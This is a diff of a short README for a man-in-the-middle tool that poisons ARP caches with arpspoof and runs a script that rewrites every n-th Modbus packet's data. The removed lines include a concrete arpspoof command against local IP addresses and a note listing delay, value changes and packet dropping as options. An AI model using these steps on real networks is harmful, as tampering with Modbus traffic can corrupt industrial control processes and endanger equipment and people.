@@ -1,15 +1,18 @@
-moznosti:
-  delay
-  zmena hodnot 
-  neposlani nekterych paketu
+# About
+This is MIMA that uses `arpspoof` tool for arp cache poisoning.
+`mima.py` program redirects packets to their true recipients by changing the packets' destination MAC. It also modifies each n-th Modbus packet data part. 
+Program can be easily modified for whatever MIMA attack. 
 
-# .250 is device where we wants to spof arp table 
-# .252 arp record we want to rewrite with our mac address 
-`arpspoof -i eno2 -t 192.168.88.250 192.168.88.252
+# Run
+## 1. Arp cache poisoning 
+`sudo arp-spoofing.sh`
+## 2. Attack 
+`sudo python3 mima.py`
 
-linux:
+## Debug on attacked devices
+# linux:
 `arp -a -i eno2`
 
-windows:
+# windows:
 `arp -a`
  
